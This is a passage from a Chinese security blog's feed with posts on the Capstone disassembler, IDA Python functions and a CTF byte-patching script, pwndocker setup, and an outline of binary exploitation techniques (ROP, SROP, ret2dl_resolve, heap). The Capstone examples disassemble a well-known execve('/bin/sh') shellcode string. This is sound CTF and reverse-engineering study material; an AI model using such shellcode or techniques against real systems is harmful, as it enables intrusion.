    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>复现网鼎的题目的时候看到大佬用了Capstone，结果看不懂。。。。就顺便学习下。。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>感觉还是看官方文档更全面一点：<a href="http://www.capstone-engine.org/lang_python.html" target="_blank" rel="noopener">http://www.capstone-engine.org/lang_python.html</a></p><p>这里就搞几个小脚本来学习下怎么用。</p><h3 id="脚本1：基础反汇编"><a href="#脚本1：基础反汇编" class="headerlink" title="脚本1：基础反汇编"></a>脚本1：基础反汇编</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line">cs = Cs(CS_ARCH_X86, CS_MODE_64)<span class="comment">#设置cpu体系为64位的x86</span></span><br><span class="line">cs.detail = <span class="literal">True</span></span><br><span class="line">code = <span class="string">'\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'</span></span><br><span class="line">discode = cs.disasm(code, <span class="number">0x400800</span>)<span class="comment">#反汇编代码，其实地址为0x400800</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> discode:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"0x%x:\t%s\t%s"</span> % (i.address,i.mnemonic,i.op_str)</span><br></pre></td></tr></table></figure><p>直接运行，就可以得到类似ida中看到的内容：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ python example1.py</span><br><span class="line">0x400800:       jmp     0x40080d</span><br><span class="line">0x400802:       pop     rbx</span><br><span class="line">0x400803:       xor     eax, eax</span><br><span class="line">0x400805:       xor     ecx, ecx</span><br><span class="line">0x400807:       xor     edx, edx</span><br><span class="line">0x400809:       mov     al, 0xb</span><br><span class="line">0x40080b:       int     0x80</span><br><span class="line">0x40080d:       call    0x400802</span><br></pre></td></tr></table></figure><p>上面for循环遍历出来的i有如下几个成员：</p><table><thead><tr><th>成员名</th><th>描述</th></tr></thead><tbody><tr><td>id</td><td>汇编指令的id</td></tr><tr><td>address</td><td>代码地址</td></tr><tr><td>mnemonic</td><td>汇编指令</td></tr><tr><td>op_str</td><td>操作对象字符串</td></tr><tr><td>size</td><td>汇编指令的大小</td></tr><tr><td>bytes</td><td>返回对应汇编指令的机器码</td></tr><tr><td>operands</td><td>操作对象（后面介绍）</td></tr></tbody></table><h3 id="脚本2：operands尝试"><a href="#脚本2：operands尝试" class="headerlink" title="脚本2：operands尝试"></a>脚本2：operands尝试</h3><p>operands也包含了很多成员，下面跟着官方文档来尝试操作下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone.x86 <span class="keyword">import</span> *</span><br><span class="line">cs = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line">cs.detail = <span class="literal">True</span></span><br><span class="line">code = <span class="string">'\x8B\x87\x76\x98\x00\x00\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'</span></span><br><span class="line"><span class="keyword">for</span> insn <span class="keyword">in</span> cs.disasm(code, <span class="number">0x1000</span>):</span><br><span class="line"><span class="keyword">print</span> <span class="string">"0x%x:\t%s\t%s"</span> % (insn.address,insn.mnemonic,insn.op_str)</span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> insn.operands:</span><br><span class="line">c+=<span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\toperands[%d]:"</span>%c</span><br><span class="line"><span class="keyword">if</span> i.type == X86_OP_REG:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\t\tREG=%s"</span>%(insn.reg_name(i.value.reg))<span class="comment">#获取寄存器的名称</span></span><br><span class="line"><span class="keyword">if</span> i.type == X86_OP_IMM:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t\tIMM=0x%x"</span>%(i.value.imm)<span class="comment">#获取立即数</span></span><br><span class="line"><span class="keyword">if</span> i.type == X86_OP_MEM:<span class="comment">#如[rax+0x10]或[rax+rbx]</span></span><br><span class="line"><span class="keyword">if</span> i.mem.base != <span class="number">0</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t\tREG=%s"</span>%(insn.reg_name(i.mem.base))<span class="comment">#获取寄存器名称，即rax</span></span><br><span class="line"><span class="keyword">if</span> i.mem.index != <span class="number">0</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t\tIMM=0x%x"</span>%(i.mem.index)<span class="comment">#获取第二个寄存器名称，即rbx</span></span><br><span class="line"><span class="keyword">if</span> i.mem.disp != <span class="number">0</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t\tIMM=0x%x"</span>%(i.mem.disp)<span class="comment">#获取偏移量，即0x10</span></span><br></pre></td></tr></table></figure><p>对应的输出：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">$ python example2.py</span><br><span class="line">0x1000: mov     eax, dword ptr [rdi + 0x9876]</span><br><span class="line">        operands[1]:</span><br><span class="line">                REG=eax</span><br><span class="line">        operands[2]:</span><br><span class="line">                REG=rdi</span><br><span class="line">                IMM=0x9876</span><br><span class="line">0x1006: jmp     0x1013</span><br><span class="line">        operands[1]:</span><br><span class="line">                IMM=0x1013</span><br><span class="line">0x1008: pop     rbx</span><br><span class="line">        operands[1]:</span><br><span class="line">                REG=rbx</span><br><span class="line">0x1009: xor     eax, eax</span><br><span class="line">        operands[1]:</span><br><span class="line">                REG=eax</span><br><span class="line">        operands[2]:</span><br><span class="line">                REG=eax</span><br><span class="line">0x100b: xor     ecx, ecx</span><br><span class="line">        operands[1]:</span><br><span class="line">                REG=ecx</span><br><span class="line">        operands[2]:</span><br><span class="line">                REG=ecx</span><br><span class="line">0x100d: xor     edx, edx</span><br><span class="line">        operands[1]:</span><br><span class="line">                REG=edx</span><br><span class="line">        operands[2]:</span><br><span class="line">                REG=edx</span><br><span class="line">0x100f: mov     al, 0xb</span><br><span class="line">        operands[1]:</span><br><span class="line">                REG=al</span><br><span class="line">        operands[2]:</span><br><span class="line">                IMM=0xb</span><br><span class="line">0x1011: int     0x80</span><br><span class="line">        operands[1]:</span><br><span class="line">                IMM=0x80</span><br><span class="line">0x1013: call    0x1008</span><br><span class="line">        operands[1]:</span><br><span class="line">                IMM=0x1008</span><br></pre></td></tr></table></figure><p>呃。。。大概就先这样吧，后面有遇到需要再补充</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;复现网鼎的题目的时候看到大佬用了Capstone，结果看不懂。。。。就顺便学习下。。&lt;/p&gt;
&lt;h1 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正
      
    
    </summary>
    
    
      <category term="RE" scheme="https://nuoye-blog.github.io/categories/RE/"/>
    
    
      <category term="RE" scheme="https://nuoye-blog.github.io/tags/RE/"/>
    
      <category term="tool" scheme="https://nuoye-blog.github.io/tags/tool/"/>
    
      <category term="python" scheme="https://nuoye-blog.github.io/tags/python/"/>
    
      <category term="ida" scheme="https://nuoye-blog.github.io/tags/ida/"/>
    
  </entry>
  
  <entry>
    <title>跟着Lantern学逆向之IDA python</title>
    <link href="https://nuoye-blog.github.io/2020/05/18/RE/%E8%B7%9F%E7%9D%80Lantern%E5%AD%A6RE%E4%B9%8BIDA%20python/"/>
    <id>https://nuoye-blog.github.io/2020/05/18/RE/%E8%B7%9F%E7%9D%80Lantern%E5%AD%A6RE%E4%B9%8BIDA%20python/</id>
    <published>2020-05-18T08:42:00.000Z</published>
    <updated>2020-05-18T08:41:45.682Z</updated>
    
    <content type="html"><![CDATA[<p>跟着<a href="https://lantern.cool/2020/05/05/ida-python/" target="_blank" rel="noopener">Lantern</a>学逆向之IDA python:</p><h1 id="函数表"><a href="#函数表" class="headerlink" title="函数表"></a>函数表</h1><p>首先是介绍一些函数：</p><table><thead><tr><th>函数名</th><th>作用</th></tr></thead><tbody><tr><td>ScreenEA()</td><td>获取 IDA 调试窗口中，光标指向代码的地址。</td></tr><tr><td>GetInputFileMD5()</td><td>返回 IDA 加载的二进制文件的 MD5 值。</td></tr><tr><td>FirstSeg()</td><td>访问程序中的第一个段。</td></tr><tr><td>NextSeg()</td><td>访问下一个段，如果没有就返回 BADADDR。</td></tr><tr><td>SegByName( string SegmentName )</td><td>通过段名字返回段基址，举个例子，如果调用.text 作为参数，就会返回程序中代码段的开始位置。</td></tr><tr><td>SegEnd( long Address )</td><td>通过段内的某个地址，获得段尾的地址。</td></tr><tr><td>SegStart( long Address )</td><td>通过段内的某个地址，获得段头的地址。</td></tr><tr><td>SegName( long Address )</td><td>通过段内的某个地址，获得段名。</td></tr><tr><td>Segments()</td><td>返回目标程序中的所有段的开始地址。</td></tr><tr><td>Functions( long StartAddress, long EndAddress )</td><td>返回一个列表，包含了从 StartAddress 到 EndAddress 之间的所有函数。</td></tr><tr><td>Chunks( long FunctionAddress )</td><td>返回一个列表，包含了函数片段。每个列表项都是一个元组（chunk start, chunk end）</td></tr><tr><td>LocByName( string FunctionName )</td><td>通过函数名返回函数的地址。</td></tr><tr><td>GetFuncOffset( long Address )</td><td>通过任意一个地址，然后得到这个地址所属的函数名，以及给定地址和函数的相对位移。 然后把这些信息组成字符串以”名字+位移”的形式返回。</td></tr><tr><td>GetFunctionName( long Address )</td><td>通过一个地址，返回这个地址所属的函数。</td></tr><tr><td>CodeRefsTo( long Address, bool Flow )</td><td>返回一个列表，告诉我们 Address 处代码被什么地方引用了，Flow 告诉 IDAPython 是否要 跟踪这些代码。</td></tr><tr><td>CodeRefsFrom( long Address, bool Flow )</td><td>返回一个列表，告诉我们 Address 地址上的代码引用何处的代码。</td></tr><tr><td>DataRefsTo( long Address )</td><td>返回一个列表，告诉我们 Address 处数据被什么地方引用了。常用于跟踪全局变量。</td></tr><tr><td>DataRefsFrom( long Address )</td><td>返回一个列表，告诉我们 Address 地址上的代码引用何处的数据。</td></tr><tr><td>Heads(start=None, end=None)</td><td>得到两个地址之间所有的元素</td></tr><tr><td>GetDisasm(addr)</td><td>得到addr的反汇编语句</td></tr><tr><td>GetMnem(addr)</td><td>得到addr地址的操作码</td></tr><tr><td>BADADDR</td><td>验证是不是错误地址</td></tr><tr><td>GetOpnd(addr，long n)</td><td>第一个参数是地址，第二个long n是操作数索引。第一个操作数是0和第二个是1。</td></tr><tr><td>idaapi.decode_insn(ea)</td><td>得到当前地址指令的长度</td></tr><tr><td>idc.FindFuncEnd(ea)</td><td>找到当前地址的函数结束地址</td></tr><tr><td>Entries()</td><td>入口点信息</td></tr><tr><td>Structs()</td><td>遍历结构体</td></tr><tr><td>StructMembers(sid)</td><td>遍历结构体成员</td></tr><tr><td>DecodePrecedingInstruction(ea)</td><td>获取指令结构</td></tr><tr><td>DecodePreviousInstruction(ea)</td><td>获取指令结构</td></tr><tr><td>DecodeInstruction(ea)</td><td>获取指令结构</td></tr><tr><td>Strings(object)</td><td>获取字符串</td></tr><tr><td>GetIdbDir()</td><td>获取idb目录</td></tr><tr><td>GetRegisterList()</td><td>获取寄存器名表</td></tr><tr><td>GetInstructionList</td><td>获取汇编指令表</td></tr><tr><td>atoa(ea)</td><td>获取所在段</td></tr><tr><td>Jump(ea)</td><td>移动光标</td></tr><tr><td>Eval(expr)</td><td>计算表达式</td></tr><tr><td>Exec(command)</td><td>执行命令行</td></tr><tr><td>MakeCode(ea)</td><td>分析代码区</td></tr><tr><td>MakeNameEx(ea, name, flags)</td><td>重命名地址</td></tr><tr><td>MakeArray(ea, nitems)</td><td>创建数组</td></tr><tr><td>MakeStr(ea, endea)</td><td>创建字符串</td></tr><tr><td>MakeData(ea, flags, size, tid)</td><td>创建数据</td></tr><tr><td>MakeByte(ea)</td><td></td></tr><tr><td>MakeWord(ea)</td><td></td></tr><tr><td>MakeDWord(ea)</td><td></td></tr><tr><td>MakeQWord(ea)</td><td></td></tr><tr><td>MakeOWord(ea)</td><td></td></tr><tr><td>MakeYWord(ea)</td><td></td></tr><tr><td>MakeFlot(ea)</td><td></td></tr><tr><td>MakeDouble(ea)</td><td></td></tr><tr><td>MakePackReal(ea)</td><td></td></tr><tr><td>MakeTbyte(ea)</td><td></td></tr><tr><td>MakeStructEx(ea)</td><td></td></tr><tr><td>MakeCustomDataEx(ea)</td><td></td></tr><tr><td>PatchByte(ea, value)</td><td>修改程序字节</td></tr><tr><td>PatchWord(ea, value)</td><td>修改程序字</td></tr><tr><td>PatchDword(ea, value)</td><td>修改程序双字</td></tr><tr><td>Byte(ea)</td><td>将地址解释为Byte</td></tr><tr><td>Word(ea)</td><td></td></tr><tr><td>DWord(ea)</td><td></td></tr><tr><td>QWord(ea)</td><td></td></tr><tr><td>GetFloat(ea)</td><td>获取浮点数</td></tr><tr><td>GetDouble(ea)</td><td>获取双精度浮点数</td></tr><tr><td>GetString(ea, length = -1, strtype = ASCSTR_C)</td><td>获取字符串</td></tr><tr><td>GetCurrentLine()</td><td>获取光标所在行反汇编</td></tr><tr><td>ItemSize(ea)</td><td>获取指令或数据长度</td></tr><tr><td>FindText(ea, flag, y, x, searchstr)</td><td>查找文本</td></tr><tr><td>FindBinary(ea, flag, searchstr, radix=16)</td><td>查找16进制</td></tr><tr><td>GetEntryPointQty()</td><td>获取入口点个数</td></tr><tr><td>GetEntryOrdinal(index)</td><td>获取入口点地址</td></tr><tr><td>GetEntryName(ordinal)</td><td>获得入口名</td></tr></tbody></table><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><h3 id="xman2019-trydbg-exe"><a href="#xman2019-trydbg-exe" class="headerlink" title="xman2019-trydbg.exe"></a>xman2019-trydbg.exe</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">addr = find_binary(<span class="number">0x140001050</span>, <span class="number">1</span>, <span class="string">'74 12 75 10 4C 7F 53 0C 0C 54 8F C4 28 E9 42 FE FF FF 80 75'</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">     ea - address to start from</span></span><br><span class="line"><span class="string">     str - a string as a user enters it for Search Text in Core</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">if</span> addr == BADADDR:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">PatchByte(addr+i, <span class="number">0x90</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;跟着&lt;a href=&quot;https://lantern.cool/2020/05/05/ida-python/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lantern&lt;/a&gt;学逆向之IDA python:&lt;/p&gt;
&lt;h1 id=&quot;函数表&quot;&gt;&lt;a hre
      
    
    </summary>
    
    
      <category term="RE" scheme="https://nuoye-blog.github.io/categories/RE/"/>
    
    
      <category term="RE" scheme="https://nuoye-blog.github.io/tags/RE/"/>
    
      <category term="tool" scheme="https://nuoye-blog.github.io/tags/tool/"/>
    
      <category term="python" scheme="https://nuoye-blog.github.io/tags/python/"/>
    
      <category term="ida" scheme="https://nuoye-blog.github.io/tags/ida/"/>
    
  </entry>
  
  <entry>
    <title>pwndocker篇</title>
    <link href="https://nuoye-blog.github.io/2020/05/16/tool/Pwndocker%E7%AF%87/"/>
    <id>https://nuoye-blog.github.io/2020/05/16/tool/Pwndocker%E7%AF%87/</id>
    <published>2020-05-16T14:32:00.000Z</published>
    <updated>2020-05-24T15:08:15.528Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -fsSL https://get.docker.com -o get-docker.sh</span><br><span class="line">$ sudo sh get-docker.sh</span><br><span class="line">$ sudo usermod -aG docker username</span><br></pre></td></tr></table></figure><h2 id="pwndocker安装"><a href="#pwndocker安装" class="headerlink" title="pwndocker安装"></a>pwndocker安装</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker pull skysider/pwndocker</span><br></pre></td></tr></table></figure><h2 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h2><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pip2 install -i https:<span class="comment">//pypi.tuna.tsinghua.edu.cn/simple pwntools</span></span><br></pre></td></tr></table></figure><p>后面gdb.attach()有点问题，还是先用python3吧</p><h1 id="镜像管理"><a href="#镜像管理" class="headerlink" title="镜像管理"></a>镜像管理</h1><h2 id="保存镜像"><a href="#保存镜像" class="headerlink" title="保存镜像"></a>保存镜像</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker commit docker_id mydocker</span><br></pre></td></tr></table></figure><h2 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker rmi -f mydocker</span><br></pre></td></tr></table></figure><h1 id="容器管理"><a href="#容器管理" class="headerlink" title="容器管理"></a>容器管理</h1><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -d --privileged skysider/pwndocker</span><br></pre></td></tr></table></figure><p>即可后台运行（–privileged表示特权级运行，不加gdb会没有权限）</p><p>第二次直接查看id后运行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker ps -a</span><br><span class="line">$ docker start docker_id</span><br></pre></td></tr></table></figure><h2 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker <span class="built_in">exec</span> -it docker_id /bin/sh</span><br></pre></td></tr></table></figure><p>即可进入docker的shell</p><h2 id="停止docker"><a href="#停止docker" class="headerlink" title="停止docker"></a>停止docker</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker stop docker_id</span><br></pre></td></tr></table></figure><h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker rm docker_id</span><br></pre></td></tr></table></figure><h1 id="指定libc"><a href="#指定libc" class="headerlink" title="指定libc"></a>指定libc</h1><p>首先写个shell脚本实现自动化</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">id=***</span><br><span class="line">docker cp ./1.py <span class="variable">$&#123;id&#125;</span>:/tmp</span><br><span class="line">docker cp ./elf <span class="variable">$&#123;id&#125;</span>:/tmp</span><br><span class="line">docker <span class="built_in">exec</span> -it <span class="variable">$&#123;id&#125;</span> chmod 777 /tmp/elf</span><br><span class="line">docker <span class="built_in">exec</span> -it <span class="variable">$&#123;id&#125;</span> chmod 777 /tmp/1.py</span><br><span class="line">docker <span class="built_in">exec</span> -it <span class="variable">$&#123;id&#125;</span> cp /glibc/2.29/64/lib/ld-2.29.so /tmp</span><br><span class="line">docker <span class="built_in">exec</span> -it <span class="variable">$&#123;id&#125;</span> cp /glibc/2.29/64/lib/libc.so.6 /tmp</span><br><span class="line">docker <span class="built_in">exec</span> -it <span class="variable">$&#123;id&#125;</span> patchelf --<span class="built_in">set</span>-interpreter /tmp/ld-2.29.so /tmp/elf</span><br><span class="line">docker <span class="built_in">exec</span> -it <span class="variable">$&#123;id&#125;</span> tmux</span><br></pre></td></tr></table></figure><p>具体功能就是将elf和python文件cp到docker上，然后给予权限，再将libc和ld（这里用2.29版本）移到/tmp下，再用patchelf –set-interpreter修改elf的ld文件，然后进入tmux。这里还需要在手动运行python脚本（这里不会自动化，希望有大佬能帮忙下）。</p><p>然后就是python脚本中指定libc执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"/tmp/elf"</span>, env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/tmp/libc.so.6"</span>&#125;)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h1&gt;&lt;h2 id=&quot;docker安装&quot;&gt;&lt;a href=&quot;#docker安装&quot; class=&quot;headerlink&quot; title=&quot;docker安装&quot;
      
    
    </summary>
    
    
      <category term="tool" scheme="https://nuoye-blog.github.io/categories/tool/"/>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/tags/pwn/"/>
    
      <category term="tool" scheme="https://nuoye-blog.github.io/tags/tool/"/>
    
      <category term="docker" scheme="https://nuoye-blog.github.io/tags/docker/"/>
    
      <category term="glibc" scheme="https://nuoye-blog.github.io/tags/glibc/"/>
    
  </entry>
  
  <entry>
    <title>pwn中各种利用技巧1</title>
    <link href="https://nuoye-blog.github.io/2020/05/09/pwn/pwn%E4%B8%AD%E5%90%84%E7%A7%8D%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A71/"/>
    <id>https://nuoye-blog.github.io/2020/05/09/pwn/pwn%E4%B8%AD%E5%90%84%E7%A7%8D%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A71/</id>
    <published>2020-05-08T16:00:00.000Z</published>
    <updated>2020-05-18T08:42:30.276Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关闭aslr"><a href="#关闭aslr" class="headerlink" title="关闭aslr"></a>关闭aslr</h1><p>sudo sysctl -w kernel.randomize_va_space=0</p><h1 id="绑定libc"><a href="#绑定libc" class="headerlink" title="绑定libc"></a>绑定libc</h1><p>p=process([‘./bin’],env={‘LOAD_PRELOAD’:’./libc-2.23.so’})</p><h1 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h1><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p><strong>Defcon 2015 Qualifier R0pbaby，AliCTF 2016 vss，PlaidCTF 2013 ropasaurusrex</strong></p><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>找后门位置</p><h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>shellcode的编写，以及一些编码的方法，如可见字符的shellcode等</p><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>参数的设置</p><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>leak出libc，以及确定libc的版本</p><h3 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h3><p>__libc_csu_init中的gadgets</p><h3 id="ret2reg"><a href="#ret2reg" class="headerlink" title="ret2reg"></a>ret2reg</h3><p>找call reg或者jmp reg</p><h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2><p>Defcon 2015 Qualifier fuckup</p><h2 id="BROP"><a href="#BROP" class="headerlink" title="BROP"></a>BROP</h2><p><a href="http://ytliu.info/blog/2014/05/31/blind-return-oriented-programming-brop-attack-er" target="_blank" rel="noopener">http://ytliu.info/blog/2014/05/31/blind-return-oriented-programming-brop-attack-er</a></p><p><strong>HCTF 2016 出题人跑路了(pwn50)</strong></p><h2 id="stack-pivot"><a href="#stack-pivot" class="headerlink" title="stack pivot"></a>stack pivot</h2><p><strong>EKOPARTY CTF 2016 fuckzing-exploit-200(基于栈的stack pivot)</strong><br><strong>HACKIM CTF 2015 -Exploitation 5(基于堆的stack pivot)</strong></p><h2 id="ret2dl-resolve"><a href="#ret2dl-resolve" class="headerlink" title="ret2dl_resolve"></a>ret2dl_resolve</h2><p>了解动态链接的过程：<br>《程序员的自我修养》<br><a href="http://blog.chinaunix.net/uid-2477416-id-3053007.html" target="_blank" rel="noopener">http://blog.chinaunix.net/uid-2477416-id-3053007.html</a></p><p>伪造动态链接的相关数据结构如linkmap、relplt：<br><a href="http://rk700.github.io/2015/08/09/return-to-dl-resolve/" target="_blank" rel="noopener">http://rk700.github.io/2015/08/09/return-to-dl-resolve/</a><br><a href="http://angelboy.logdown.com/posts/283218-return-to-dl-resolve" target="_blank" rel="noopener">http://angelboy.logdown.com/posts/283218-return-to-dl-resolve</a><br><a href="http://www.inforsec.org/wp/?p=389" target="_blank" rel="noopener">http://www.inforsec.org/wp/?p=389</a><br><strong>Codegate CTF Finals 2015 yocto(fake relplt) <a href="http://o0xmuhe.me/2016/10/25/yocto-writeup" target="_blank" rel="noopener">http://o0xmuhe.me/2016/10/25/yocto-writeup</a></strong><br><strong>HITCON QUALS CTF 2015 readable(fake linkmap)</strong></p><p><strong>Hack.lu’s 2015 OREO</strong></p><h2 id="Stack-smash"><a href="#Stack-smash" class="headerlink" title="Stack smash"></a>Stack smash</h2><p>覆盖canary保护输出的字符地址</p><h2 id="Partial-Overwrite"><a href="#Partial-Overwrite" class="headerlink" title="Partial Overwrite"></a>Partial Overwrite</h2><p><a href="http://ly0n.me/2015/07/30/bypass-aslr-with-partial-eip-overwrite/" target="_blank" rel="noopener">http://ly0n.me/2015/07/30/bypass-aslr-with-partial-eip-overwrite/</a><br>HCTF 2016 fheap(基于堆溢出的Partial overwrite)<br>溢出位数不够：<br><strong>XMAN 2016 广外女生-pwn</strong><br><strong>Codegate CTF Finals 2015,chess</strong></p><h1 id="Heap"><a href="#Heap" class="headerlink" title="Heap"></a>Heap</h1><h2 id="堆管理机制"><a href="#堆管理机制" class="headerlink" title="堆管理机制"></a>堆管理机制</h2><p>多数Linux发行版：ptmalloc/dlmalloc glibc内存管理ptmalloc源代码分析.pdf（精读1-27，粗读28-130）<br>Android/firfox:jemalloc<br>windows:微软自己实现了一套内存管理机制<br>Linux内核：slab、slub、slob分配器</p><h2 id="堆漏洞的利用思想"><a 